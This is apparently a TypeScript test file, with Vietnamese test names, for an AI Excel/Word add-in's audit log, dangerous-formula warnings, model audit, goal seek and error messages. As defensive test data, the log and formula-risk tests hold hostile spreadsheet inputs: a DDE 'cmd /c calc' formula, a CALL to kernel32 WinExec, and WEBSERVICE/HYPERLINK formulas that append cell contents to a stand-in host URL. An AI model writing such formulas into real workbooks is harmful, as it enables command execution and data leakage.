/** Đợt 4 (bản 4.4.0): Excel và dấu vết soát lại — nhật ký, hàm nguy hiểm, kiểm toán mô hình, giải ngược; việc tồn: lỗi 413 của Groq,
 *  che mã tổ chức, gợi ý mở lại cửa sổ Word. */
import * as assert from "assert";
import { LOG_HEADER, LOG_SHEET, MAX_CELL_ROWS, buildLogRows, diffCells, formatLogTime, isLogSheet, logText, targetsLogSheet, undoLogRow } from "../../src/core/auditlog";
import { findFormulaRisks, formulaRiskMessage, formulaRisksOf } from "../../src/core/formularisk";
import { auditModel, embeddedRates } from "../../src/core/modelaudit";
import { cleanNumberList, goalSeek } from "../../src/core/goalseek";
import { ApiError, classifyError, describeError, explainApiError, isRetryable, maskSecrets, officeErrorHint, tpmNumbers } from "../../src/core/errors";
import { cellAddress } from "../../src/office/util";
import { excelTools } from "../../src/office/excelTools";
import { EXCEL_MODEL_SPECS, cleanName } from "../../src/office/excelModel";
import { withAuditTrail } from "../../src/office/excelTrail";
import { describeCall, getHostTools } from "../../src/office/tools";
import { DEFAULT_SETTINGS } from "../../src/core/storage";
import { runAgent } from "../../src/core/agent/loop";
import { PROVIDERS } from "../../src/core/providers";

const T = new Date(2026, 10, 16, 9, 5, 7);

describe("Đợt 4 · Nhật ký AI (dấu vết soát lại)", () => {
  it("Mặc định tắt cả nhật ký lẫn tô sáng", () => {
    assert.strictEqual(DEFAULT_SETTINGS.excelLog, false);
    assert.strictEqual(DEFAULT_SETTINGS.excelHighlight, false);
  });

  it("Một ô đổi → một dòng đủ 7 cột: giờ, sheet, ô, cũ, mới, thao tác và lý do, yêu cầu", () => {
    const changes = diffCells([[100]], [["120"]], { col: 1, row: 3 }, cellAddress);
    assert.deepStrictEqual(changes, [{ cell: "B4", before: 100, after: "120" }]);
    const rows = buildLogRows({ time: T, sheet: "Mô hình", address: "B4", changes, action: "Ghi dữ liệu vào Mô hình!B4", reason: "Tăng giá bán theo yêu cầu", request: "Tăng giá bán lên 120" });
    assert.strictEqual(rows.length, 1);
    assert.strictEqual(rows[0].length, LOG_HEADER.length);
    assert.deepStrictEqual(rows[0].slice(0, 5), ["16/11/2026 09:05:07", "Mô hình", "B4", "100", "120"]);
    assert.match(rows[0][5], /Ghi dữ liệu vào Mô hình!B4 — Tăng giá bán theo yêu cầu/);
    assert.strictEqual(rows[0][6], "Tăng giá bán lên 120");
    assert.strictEqual(formatLogTime(T), "16/11/2026 09:05:07");
  });

  it("Chỉ ô đổi nội dung mới vào nhật ký; số và chữ số giống nhau không tính là đổi", () => {
    const ch = diffCells([[1, "a"], ["", 5]], [["1", "b"], ["", "6"]], { col: 0, row: 0 }, cellAddress);
    assert.deepStrictEqual(ch.map((c) => c.cell), ["B1", "B2"]);
    assert.strictEqual(buildLogRows({ time: T, sheet: "S", address: "A1", changes: [], action: "Ghi" })[0][3], "(không đổi)");
  });

  it("Nhiều ô: tối đa 20 dòng theo ô, phần còn lại gộp một dòng; thao tác không đổi ô (định dạng, biểu đồ): một dòng", () => {
    const after = Array.from({ length: 30 }, (_, i) => [String(i)]);
    const rows = buildLogRows({ time: T, sheet: "S", address: "A1:A30", changes: diffCells(null, after, { col: 0, row: 0 }, cellAddress), action: "Ghi" });
    assert.strictEqual(rows.length, MAX_CELL_ROWS + 1);
    assert.match(rows[MAX_CELL_ROWS][4], /và 10 ô khác/);
    const one = buildLogRows({ time: T, sheet: "S", address: "A1:B2", action: "Định dạng S!A1:B2" });
    assert.strictEqual(one.length, 1);
    assert.deepStrictEqual(one[0].slice(2, 5), ["A1:B2", "", ""]);
  });

  it("Nội dung ghi vào nhật ký luôn là CHỮ: công thức và chuỗi bắt đầu bằng = + - @ được vô hiệu; cắt độ dài; gộp xuống dòng", () => {
    for (const bad of ['=WEBSERVICE("http://x/"&A1)', "+1+1", "-2+3", "@SUM(A1)", "=cmd|'/c calc'!A1"]) assert.ok(logText(bad).startsWith("'"), bad);
    assert.strictEqual(logText("Doanh thu"), "Doanh thu");
    assert.strictEqual(logText(100), "100");
    assert.strictEqual(logText(""), "");
    assert.ok(logText("x".repeat(1000)).length <= 250);
    assert.strictEqual(logText("a\nb\tc"), "a b c");
    const rows = buildLogRows({ time: T, sheet: "S", address: "A1", changes: [{ cell: "A1", before: "", after: "=1+1" }], action: "Ghi", reason: "=HYPERLINK(1)", request: "=A1" });
    assert.strictEqual(rows[0][4], "'=1+1");
    assert.ok(!rows[0][5].startsWith("=") && rows[0][6].startsWith("'="));
  });

  it("Dòng hoàn tác và nhận diện sheet nhật ký", () => {
    const u = undoLogRow(T, "S", "B4", "Ghi S!B4");
    assert.strictEqual(u.length, LOG_HEADER.length);
    assert.match(u[5], /^Hoàn tác: Ghi S!B4/);
    assert.ok(isLogSheet("Nhật ký AI") && isLogSheet(" nhật ký ai ") && isLogSheet("'Nhật ký AI'"));
    assert.ok(!isLogSheet("Nhật ký") && !isLogSheet("") && !isLogSheet(undefined));
    assert.ok(targetsLogSheet({ sheet: "Nhật ký AI", address: "A1" }));
    assert.ok(targetsLogSheet({ address: "'Nhật ký AI'!A2:C3" }));
    assert.ok(targetsLogSheet({ address: "Sheet1!A1,'Nhật ký AI'!B2" }));
    assert.ok(targetsLogSheet({ action: "rename", sheet: "Sheet1", new_name: "Nhật ký AI" }));
    assert.ok(!targetsLogSheet({ sheet: "Sheet1", address: "A1", values: [["Nhật ký AI"]] }));
    assert.ok(!targetsLogSheet({ address: "Nhật ký!A1" }));
  });

  it("Lớp bọc: AI không ghi được vào sheet nhật ký (xóa sheet thì được); dữ liệu __trail không lọt ra kết quả; tắt thì không gọi Excel", async () => {
    const calls: string[] = [];
    const base: any = {
      host: "Excel",
      specs: [
        { name: "excel_write_range", description: "", parameters: {}, write: true },
        { name: "excel_sheet", description: "", parameters: {}, write: true },
        { name: "excel_read_range", description: "", parameters: {} },
      ],
      execute: async (name: string) => {
        calls.push(name);
        return name === "excel_write_range" ? { ok: true, message: "Đã ghi", __trail: { sheet: "S", address: "A1", before: [[""]], after: [["1"]], undoable: true } } : { ok: true };
      },
      overview: async () => ({ sheets: [{ name: "S", firstRows: [["a"]] }, { name: LOG_SHEET, firstRows: [["bí mật"]] }] }),
      systemPrompt: () => "",
    };
    const t = withAuditTrail(base, { settings: () => ({}), describe: (c) => c.name });
    const r = await t.execute("excel_write_range", { sheet: "S", address: "A1", values: [["1"]] }, { log: [] });
    assert.deepStrictEqual(r, { ok: true, message: "Đã ghi" });
    await assert.rejects(() => t.execute("excel_write_range", { sheet: LOG_SHEET, address: "A2", values: [["x"]] }, { log: [] }), /nhật ký do add-in tự ghi/);
    await assert.rejects(() => t.execute("excel_sheet", { action: "rename", sheet: LOG_SHEET, new_name: "X" }, { log: [] }), /nhật ký/);
    await t.execute("excel_sheet", { action: "delete", sheet: LOG_SHEET }, { log: [] });
    await t.execute("excel_read_range", { sheet: LOG_SHEET, address: "A1" }, { log: [] });
    assert.deepStrictEqual(calls, ["excel_write_range", "excel_sheet", "excel_read_range"]);
    const ov = await t.overview();
    assert.deepStrictEqual(ov.sheets[1].firstRows, []);
    assert.deepStrictEqual(ov.sheets[0].firstRows, [["a"]]);
  });

  it("Vòng lặp tác tử đưa lời model của bước và yêu cầu của lượt cho công cụ; hai thứ đó không thêm gì vào lịch sử gửi model", async () => {
    const sse = (events: any[]) => new Response(events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join(""), { status: 200 });
    let n = 0;
    const fetchFn: any = async () => {
      n++;
      return n === 1
        ? sse([
            { choices: [{ delta: { content: "Tôi sẽ ghi B2." } }] },
            { choices: [{ delta: { tool_calls: [{ index: 0, id: "c1", function: { name: "excel_write_range", arguments: '{"address":"B2","values":[["1"]]}' } }] } }] },
            { choices: [{ finish_reason: "tool_calls", delta: {} }] },
          ])
        : sse([{ choices: [{ delta: { content: "Xong." } }] }, { choices: [{ finish_reason: "stop", delta: {} }] }]);
    };
    let got: any;
    const tools: any = {
      host: "Excel",
      specs: [{ name: "excel_write_range", description: "", parameters: { type: "object", properties: {} }, write: true }],
      execute: async (_n: string, _a: any, ctx: any) => {
        got = ctx;
        return { ok: true };
      },
      overview: async () => ({}),
      systemPrompt: () => "",
    };
    const msgs = await runAgent({
      provider: PROVIDERS.find((p) => p.id === "groq")!,
      key: "k",
      model: "m",
      tools,
      system: "S",
      messages: [{ role: "user", content: "<bo_sung_cua_add_in>…</bo_sung_cua_add_in>\n\nGhi 1 vào B2" }],
      request: "Ghi 1 vào B2",
      log: [],
      onEvent: () => {},
      fetchFn,
    });
    assert.strictEqual(got.said, "Tôi sẽ ghi B2.");
    assert.strictEqual(got.request, "Ghi 1 vào B2");
    assert.strictEqual(msgs.length, 4);
    assert.ok(!JSON.stringify(msgs.slice(1)).includes("request"));
  });
});

describe("Đợt 4 · Hỏi trước khi ghi công thức có hàm nguy hiểm", () => {
  it("Bắt: WEBSERVICE, INDIRECT, RTD, CALL, IMAGE, DDE, HYPERLINK ghép chuỗi, liên kết tệp ngoài", () => {
    const hit = (f: string, what: RegExp) => assert.ok(formulaRisksOf(f).some((x) => what.test(x.what)), f);
    hit('=WEBSERVICE("https://x.example/?d="&A1)', /WEBSERVICE/);
    hit("=webservice (B2)", /WEBSERVICE/);
    hit('=SUM(INDIRECT("A"&ROW()))', /INDIRECT/);
    hit('=RTD("prog",,"x")', /RTD/);
    hit('=CALL("kernel32","WinExec","JCJ","calc",0)', /CALL/);
    hit('=IMAGE("https://x.example/a.png")', /IMAGE/);
    hit("=cmd|'/c calc'!A1", /DDE/);
    hit('=HYPERLINK("https://x.example/?q="&B2,"Xem")', /HYPERLINK/);
    hit("='C:\\Du an\\[Ngan sach.xlsx]Tong hop'!$B$4", /tệp ngoài/);
    hit("=[Budget.xlsx]Sheet1!A1+1", /tệp ngoài/);
    hit("=SUM([2]Data!A1:A9)", /tệp ngoài/);
  });

  it("Không báo nhầm: tên hàm trong chuỗi hoặc tên sheet, tham chiếu bảng, chữ thường, số, HYPERLINK nội bộ", () => {
    const none = (f: any) => assert.deepStrictEqual(formulaRisksOf(f), [], String(f));
    none("=SUM(B2:B10)");
    none('=IF(A1="INDIRECT(","x","WEBSERVICE(")');
    none("='Bảng INDIRECT (cũ)'!A1*2");
    none("=SUM(Bảng1[Doanh thu])");
    none("=[@[Đơn giá]]*[@[Số lượng]]");
    none("=Bảng1[[#Totals],[Thành tiền]]");
    none("Hàm INDIRECT( không nên dùng");
    none("WEBSERVICE(");
    none(123);
    none('=HYPERLINK("#Sheet2!A1","Tới sheet 2")');
    none("=CALLS!A1+RECALL(1)");
    none("=A1-B1");
    assert.strictEqual(formulaRiskMessage([["=SUM(A1:A3)", "abc"], [1, 2]]), null);
  });

  it("Câu cảnh báo nêu tên hàm, ô và công thức; quét cả khối hai chiều", () => {
    const vals = [["Tên", "=A1"], ['=INDIRECT("B"&1)', '=INDIRECT("B"&2)']];
    assert.strictEqual(findFormulaRisks(vals).length, 2);
    const msg = formulaRiskMessage(vals, (r, c) => cellAddress(3 + c, 9 + r))!;
    assert.match(msg, /INDIRECT ở D11 và 1 ô khác/);
    assert.match(msg, /Công thức: =INDIRECT\("B"&1\)/);
  });

  it("Công cụ ghi của Excel có kiểm rủi ro; công cụ mới nào xóa hoặc mở khóa cũng có", () => {
    const risky = (n: string) => !!excelTools.specs.find((s) => s.name === n)?.risky;
    for (const n of ["excel_write_range", "excel_edit_chart", "excel_named_range", "excel_clean_data", "excel_protect"]) assert.ok(risky(n), n);
  });
});

describe("Đợt 4 · Kiểm toán mô hình", () => {
  // Lưới R1C1 của mô hình thử: hàng 0 tiêu đề; 3 số gõ cứng (D2, E5, C7) và 1 công thức lệch (E6)
  const g = (broken: boolean): any[][] => [
    ["Chỉ tiêu", "Năm 1", "Năm 2", "Năm 3", "Năm 4", "Năm 5"],
    ["Doanh thu", 500, "=RC[-1]*(1+R8C2)", broken ? 590 : "=RC[-1]*(1+R8C2)", "=RC[-1]*(1+R8C2)", "=RC[-1]*(1+R8C2)"],
    ["Chi phí", "=R[-1]C*R9C2", "=R[-1]C*R9C2", "=R[-1]C*R9C2", "=R[-1]C*R9C2", "=R[-1]C*R9C2"],
    ["Lợi nhuận gộp", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C"],
    ["Quản lý", "=R[-3]C*0.05", "=R[-3]C*0.05", "=R[-3]C*0.05", broken ? 31 : "=R[-3]C*0.05", "=R[-3]C*0.05"],
    ["Lợi nhuận", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C", broken ? "=R[-2]C-R[-3]C" : "=R[-2]C-R[-1]C", "=R[-2]C-R[-1]C"],
    ["Thuế", "=R[-1]C*0.2", broken ? 82 : "=R[-1]C*0.2", "=R[-1]C*0.2", "=R[-1]C*0.2", "=R[-1]C*0.2"],
    ["Tổng", "=SUM(R[-2]C:R[-2]C[4])", "", "", "", ""],
    ["Tăng giá", 0.08, "", "", "", ""],
  ];
  const run = (grid: any[][]) => auditModel({ r1c1: grid, origin: { col: 0, row: 0 }, addr: cellAddress });

  it("Cài 3 hằng số gõ cứng và 1 công thức lệch hàng: tìm đủ 4, đúng ô", () => {
    const r = run(g(true));
    assert.deepStrictEqual(r.findings.filter((f) => f.kind === "hardcoded").map((f) => f.cell).sort(), ["C7", "D2", "E5"]);
    assert.deepStrictEqual(r.findings.filter((f) => f.kind === "inconsistent").map((f) => f.cell), ["E6"]);
    assert.strictEqual(r.counts.hardcoded, 3);
    assert.strictEqual(r.counts.inconsistent, 1);
  });

  it("Mô hình sạch: không báo số gõ cứng, không báo công thức lệch (số đầu vào đầu dãy, dòng tổng, hàng xen kẽ cùng mẫu không bị báo)", () => {
    const r = run(g(false));
    assert.strictEqual(r.counts.hardcoded, 0);
    assert.strictEqual(r.counts.inconsistent, 0);
    assert.strictEqual(r.scanned.formulas, 4 + 5 * 5 + 1);
  });

  it("Không báo nhầm: cột một dãy công thức có dòng tổng ở cuối; ba hàng xen kẽ trùng mẫu trong mô hình một cột; bảng số liệu thuần", () => {
    const col = [["=R[-1]C*2"], ["=R[-1]C*2"], ["=R[-1]C*2"], ["=SUM(R[-3]C:R[-1]C)"]];
    assert.strictEqual(run(col).findings.length, 0);
    const alt = [["=R[-2]C-R[-1]C"], ["=R[-1]C*R9C2"], ["=R[-2]C-R[-1]C"], ["=SUM(R[-3]C:R[-1]C)"]];
    assert.strictEqual(run(alt).findings.filter((f) => f.kind === "inconsistent").length, 0);
    const data = [[1, 2, 3], [4, 5, 6], ["a", "b", "c"]];
    assert.strictEqual(run(data).findings.length, 0);
  });

  it("Công thức lệch theo cột trong dãy kéo xuống được tìm ra", () => {
    const col = [["=RC[-1]*2"], ["=RC[-1]*2"], ["=RC[-1]*3"], ["=RC[-1]*2"], ["=RC[-1]*2"]];
    const r = auditModel({ r1c1: col, origin: { col: 2, row: 1 }, addr: cellAddress });
    assert.deepStrictEqual(r.findings.filter((f) => f.kind === "inconsistent").map((f) => f.cell), ["C4"]);
  });

  it("Tỷ lệ gõ trong công thức: gộp theo mẫu; số nguyên, số trong chuỗi, trong tên sheet và ô tham chiếu không tính", () => {
    assert.deepStrictEqual(embeddedRates("=B2*0.05"), ["0.05"]);
    assert.deepStrictEqual(embeddedRates("=B2*10%+C2*1.1"), ["10%", "1.1"]);
    for (const f of ["=B2*12", "=ROUND(B2/C2,2)", '=IF(A1="0.5","x","y")', "='Q1.5'!A1+1", "=SUM(A1:A10)/100", "=B10+C25", "=VLOOKUP(A1,B:C,2,0)"]) assert.deepStrictEqual(embeddedRates(f), [], f);
    const r = run(g(false));
    const emb = r.findings.filter((f) => f.kind === "embedded_rate");
    assert.strictEqual(emb.length, 2);
    assert.deepStrictEqual(emb.map((f) => f.count).sort(), [5, 5]);
  });

  it("Liên kết tệp ngoài được liệt kê", () => {
    const r = auditModel({ r1c1: [["=[1]Sheet1!R1C1"]], formulas: [["=[Nguon.xlsx]Sheet1!$A$1"]], origin: { col: 0, row: 0 }, addr: cellAddress });
    assert.strictEqual(r.counts.external_link, 1);
  });
});

describe("Đợt 4 · Giải ngược và bảng nhạy cảm", () => {
  it("Hàm tuyến tính, hàm lũy thừa, hàm giảm: đạt mục tiêu trong sai số 0,1% và ít lần tính", async () => {
    const cases: [(x: number) => number, number, number][] = [
      [(x) => 3 * x + 10, 100, 5],
      [(x) => 500 * Math.pow(1 + x, 4), 800, 0.08],
      [(x) => 1000 / (1 + x), 250, 1],
      [(x) => x * x * x - 2 * x, 20, 1],
    ];
    for (const [f, target, start] of cases) {
      let n = 0;
      const r = await goalSeek(async (x) => (n++, f(x)), { target, start });
      assert.ok(r.ok, `không tìm được cho mục tiêu ${target}: ${r.reason}`);
      assert.ok(Math.abs(f(r.x) - target) / target <= 0.001, `lệch quá 0,1%: ${f(r.x)} so với ${target}`);
      assert.ok(n <= 60 && r.iterations === n, `số lần tính ${n}`);
    }
  });

  it("Xuất phát từ 0, mục tiêu bằng 0, có chặn min / max", async () => {
    const a = await goalSeek(async (x) => 2 * x - 7, { target: 0, start: 0 });
    assert.ok(a.ok && Math.abs(a.x - 3.5) < 1e-4);
    const b = await goalSeek(async (x) => x * x, { target: 9, start: 1, min: 0, max: 10 });
    assert.ok(b.ok && Math.abs(b.x - 3) < 1e-3);
    const c = await goalSeek(async (x) => x * x, { target: 400, start: 1, min: 0, max: 10 });
    assert.ok(!c.ok && /Không tìm được/.test(c.reason || ""));
  });

  it("Không đạt được hoặc ô kết quả không ra số: báo rõ, không lặp vô hạn", async () => {
    let n = 0;
    const a = await goalSeek(async () => (n++, 5), { target: 10, start: 1 });
    assert.ok(!a.ok && n <= 200);
    const b = await goalSeek(async () => NaN, { target: 10, start: 1 });
    assert.ok(!b.ok && /không ra số/.test(b.reason || ""));
  });

  it("Danh sách giá trị thử: chỉ số hữu hạn, tối đa 15, nhận '8%'", () => {
    assert.deepStrictEqual(cleanNumberList([0.05, "0.08", "10%", "x", null, Infinity]), [0.05, 0.08, 0.1, 0]);
    assert.strictEqual(cleanNumberList(Array.from({ length: 40 }, (_, i) => i)).length, 15);
    assert.deepStrictEqual(cleanNumberList(undefined), []);
  });
});

describe("Đợt 4 · Bộ công cụ Excel", () => {
  it("29 công cụ, không trùng tên; 9 công cụ mới đều có mô tả tiếng Việt cho khung chat", () => {
    assert.strictEqual(excelTools.specs.length, 29);
    assert.strictEqual(new Set(excelTools.specs.map((s) => s.name)).size, 29);
    assert.strictEqual(EXCEL_MODEL_SPECS.length, 9);
    for (const s of EXCEL_MODEL_SPECS) assert.notStrictEqual(describeCall({ id: "1", name: s.name, args: {} }), s.name, s.name);
    assert.match(describeCall({ id: "1", name: "excel_insert_delete", args: { action: "group_rows", at: "2", count: 3 } }), /^Nhóm 3 hàng/);
  });

  it("Công cụ chỉ đọc không mang cờ ghi (giải ngược không để lại thay đổi); công cụ sửa có cờ ghi", () => {
    const w = (n: string) => !!excelTools.specs.find((s) => s.name === n)?.write;
    for (const n of ["excel_list_objects", "excel_audit_model", "excel_what_if"]) assert.ok(!w(n), n);
    for (const n of ["excel_edit_chart", "excel_edit_pivot", "excel_page_setup", "excel_named_range", "excel_clean_data", "excel_protect"]) assert.ok(w(n), n);
  });

  it("Bộ công cụ Excel của khung được bọc lớp nhật ký; lời nhắc Excel cố định, nhắc công cụ mới, không chứa thứ hay đổi", () => {
    const t = getHostTools("Excel", () => DEFAULT_SETTINGS)!;
    assert.strictEqual(t.specs.length, 29);
    const p = t.systemPrompt();
    assert.strictEqual(p, t.systemPrompt());
    for (const n of ["excel_list_objects", "excel_edit_chart", "excel_edit_pivot", "excel_page_setup", "excel_audit_model", "excel_named_range", "excel_what_if", "excel_clean_data", "excel_protect"]) assert.ok(p.includes(n), n);
    assert.ok(!/\b20\d{2}\b/.test(p), "không chứa năm, ngày giờ");
    assert.ok(!/excel_\w+/.exec(p.replace(new RegExp(excelTools.specs.map((s) => s.name).join("|"), "g"), "")), "lời nhắc không nhắc công cụ không tồn tại");
  });

  it("Tên vùng: bỏ dấu cách, không bắt đầu bằng số, không trùng dạng địa chỉ ô", () => {
    assert.strictEqual(cleanName("Lãi suất vay"), "Lãi_suất_vay");
    assert.strictEqual(cleanName("2026 kế hoạch"), "_2026_kế_hoạch");
    assert.strictEqual(cleanName("A1"), "_A1");
    assert.strictEqual(cleanName("R1C1"), "_R1C1");
    assert.strictEqual(cleanName("Gia_ban"), "Gia_ban");
    assert.throws(() => cleanName("  "));
  });
});

describe("Đợt 4 · Việc tồn: lỗi 413 của Groq, che mã tổ chức, gợi ý mở lại cửa sổ Word", () => {
  const GROQ =
    "Request too large for model `openai/gpt-oss-20b` in organization `org_01abcdefghjkmnpqrstvwxyz12` service tier `on_demand` on tokens per minute (TPM): Limit 8000, Requested 8312, please reduce your message size and try again. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing";
  const groq = PROVIDERS.find((p) => p.id === "groq")!;

  it("413 của Groq: câu tiếng Việt nêu số token, gợi ý đổi nguồn, không tự thử lại, không còn mã tổ chức", () => {
    const x = explainApiError(413, GROQ, { provider: groq });
    assert.strictEqual(x.reason, "too_large");
    assert.match(x.text, /lớn hơn hạn mức token mỗi phút/);
    assert.match(x.text, /8\.312 token/);
    assert.match(x.text, /8\.000 token mỗi phút/);
    assert.match(x.text, /đổi sang nguồn khác/);
    assert.ok(!/org_01/.test(x.text) && !/Request too large/.test(x.text));
    const err = new ApiError(x.text, 413, undefined, x.reason);
    assert.strictEqual(isRetryable(err), false);
    const info = describeError(err, { provider: groq });
    assert.ok(!/org_01/.test(info.text) && !/org_01/.test(info.detail));
    assert.strictEqual(info.reason, "too_large");
  });

  it("429 vì quá hạn mức phút nhưng yêu cầu vẫn nhỏ hơn trần: vẫn là lỗi tạm thời, tự thử lại được; số đọc đúng", () => {
    const d = "Rate limit reached for model `x` in organization `org_01abcdefghjkmnpqrstvwxyz12` on tokens per minute (TPM): Limit 8000, Used 7000, Requested 2000. Please try again in 7.5s.";
    assert.strictEqual(classifyError(429, d).reason, undefined);
    assert.ok(isRetryable(new ApiError("x", 429)));
    assert.deepStrictEqual(tpmNumbers(GROQ), { limit: 8000, requested: 8312 });
    assert.deepStrictEqual(tpmNumbers("không có số"), { limit: undefined, requested: undefined });
    // 429 mà một yêu cầu đã vượt trần: chờ cũng không qua
    assert.strictEqual(classifyError(429, GROQ).reason, "too_large");
  });

  it("maskSecrets che mã tổ chức và mã dự án ở mọi câu đưa ra ngoài, không đụng chữ thường", () => {
    assert.ok(!maskSecrets(GROQ).includes("org_01abcdefghjkmnpqrstvwxyz12"));
    assert.match(maskSecrets(GROQ), /organization `org_…`/);
    assert.ok(!maskSecrets("org-AbCdEfGh12345678 and proj_AbCdEfGh1234").match(/AbCdEfGh/));
    assert.strictEqual(maskSecrets("the organization settings and project_plan"), "the organization settings and project_plan");
    assert.strictEqual(maskSecrets("Tổ chức org_abc ngắn"), "Tổ chức org_abc ngắn");
    assert.ok(!describeError(new ApiError(GROQ, 429)).text.includes("org_01abc"));
  });

  it("Word từ chối chèn nhận xét (AccessDenied): gợi ý mở lại cửa sổ Word; lỗi khác và công cụ khác không đổi", () => {
    const h = officeErrorHint("word_add_comment", { code: "AccessDenied", message: "AccessDenied" })!;
    assert.match(h, /cửa sổ Word đang bị THU NHỎ/);
    assert.match(h, /mở lại \(khôi phục\) cửa sổ Word/);
    assert.match(h, /Chưa thêm được nhận xét/);
    assert.strictEqual(officeErrorHint("word_add_comment", { code: "GeneralException", message: "x" }), null);
    assert.strictEqual(officeErrorHint("word_replace_text", { code: "AccessDenied" }), null);
  });
});
